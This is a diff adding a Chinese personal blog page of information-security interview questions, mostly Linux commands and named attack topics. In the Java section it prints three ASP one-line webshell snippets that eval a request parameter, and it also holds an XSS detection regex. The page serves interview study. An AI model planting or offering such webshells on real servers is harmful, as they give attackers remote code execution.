@@ -1,0 +1,212 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>信息安全笔试题收集 - Lamber&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Lamber,"> 
+    <meta name="description" content="TODO LIST
+ 渗透测试
+ Web安全
+ PHP安全
+ Java安全
+ Linux相关
+ Windows相关
+ 内网渗透
+ 安全研发
+ 甲方安全运营
+
+Web安全SQL注入的防范方法
+Java,"> 
+    <meta name="author" content="Lamber"> 
+    <link rel="alternative" href="atom.xml" title="Lamber&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Lamber&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">信息安全笔试题收集</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">信息安全笔试题收集</h1>
+        <div class="stuff">
+            <span>九月 19, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E7%AC%94%E8%AF%95/" rel="tag">笔试</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="TODO-LIST"><a href="#TODO-LIST" class="headerlink" title="TODO LIST"></a>TODO LIST</h2><ul>
+<li><input checked="" disabled="" type="checkbox"> 渗透测试</li>
+<li><input checked="" disabled="" type="checkbox"> Web安全</li>
+<li><input checked="" disabled="" type="checkbox"> PHP安全</li>
+<li><input checked="" disabled="" type="checkbox"> Java安全</li>
+<li><input checked="" disabled="" type="checkbox"> Linux相关</li>
+<li><input disabled="" type="checkbox"> Windows相关</li>
+<li><input checked="" disabled="" type="checkbox"> 内网渗透</li>
+<li><input checked="" disabled="" type="checkbox"> 安全研发</li>
+<li><input disabled="" type="checkbox"> 甲方安全运营</li>
+</ul>
+<h2 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h2><p>SQL注入的防范方法</p>
+<h2 id="Java安全"><a href="#Java安全" class="headerlink" title="Java安全"></a>Java安全</h2><p>JVM内存模型<br>程序计数器，Java栈(虚拟机栈)，本地方法栈，堆，方法区</p>
+<p>asp一句话木马写法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;lamber&quot;)%&gt;</span><br><span class="line">&lt;%execute request(&quot;lamber&quot;)%&gt;</span><br><span class="line">&lt;script language=vbs runat=server&gt;eval(request(&quot;c&quot;))&lt;/script&gt; </span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux相关"><a href="#Linux相关" class="headerlink" title="Linux相关"></a>Linux相关</h2><p>linux 减少所有用户执行权限的方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod -x    test.txt</span><br><span class="line">chmod a-x   test.txt</span><br><span class="line">chmod ugo-x test.txt</span><br></pre></td></tr></table></figure>
+
+<p>linux 查看端口占用情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:port</span><br><span class="line">netstat -tunlp | grep port</span><br></pre></td></tr></table></figure>
+
+<p>进程的通信方式<br>管道，命名管道，消息队列，信号量，共享内存</p>
+<p>批量kill掉包含某个关键字(abc)的进程<br>ps -ef | grep abc | grep -v grep | cut -c 9-15 | xargs kill -9</p>
+<p>linux服务器中木马之后，要怎样应急</p>
+<p>bash 反弹 shell</p>
+<h2 id="Windows相关"><a href="#Windows相关" class="headerlink" title="Windows相关"></a>Windows相关</h2><p>后渗透攻击方式以及相关工具<br>拿到linux服务器后进行横向凭据移动<br>如何利用存储型xss获取权限<br>小说app登录58同城账号，收到了58同城的验证码，结果被盗号，这是为何<br>java安全</p>
+<p>基线扫描中 针对k8s环境的相关危险端口和利用方式</p>
+<p>linux查找目录下的所有文件中是否含有某个字符串并指出该字符串所在行数</p>
+<p>win下查询域用户 abc 的账号信息</p>
+<p>查询所有进程服务并列举出来</p>
+<p>win下关闭文件共享的命令</p>
+<p>tcpdump的用法  host port</p>
+<p>kerberos认证协议</p>
+<p>tar解压 tar.gz 并标准输出</p>
+<p>find命令参数</p>
+<p>cookie和session的区别</p>
+<p>SSRF相关的函数</p>
+<p>报错注入函数的原理</p>
+<p>powershell 绕过 windows AMSI</p>
+<p>编写sql查询每个玩家最后一个动作 （编程题）</p>
+<p>grep查询包含关键字的文件</p>
+<p>sqlmap 保存 post数据为txt  并指定扫描参数</p>
+<p>centos 日志文件路径</p>
+<p>linux预加载挂载木马</p>
+<p><code>\&lt;\w&#123;1,10&#125;.*on\w+=</code></p>
+<p>信息安全有哪些方面，你对信息安全越来越重要这件事有什么看法<br>编写程序  读取 txt文件里的json数据  获取最多的 src_ip   并计数 src_ip 访问了目标域名host几次<br>{“src_ip”:”10.10.10.10”;”host”:”58.com”}</p>
+<h2 id="甲方安全运营"><a href="#甲方安全运营" class="headerlink" title="甲方安全运营"></a>甲方安全运营</h2><p>信息安全三要素 (★★★)<br>保密性(Confidentiality)、完整性(Integrity)和可用性(Availability)</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="https://link.hhtjim.com/163/1815162101.mp3">
+            </audio>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
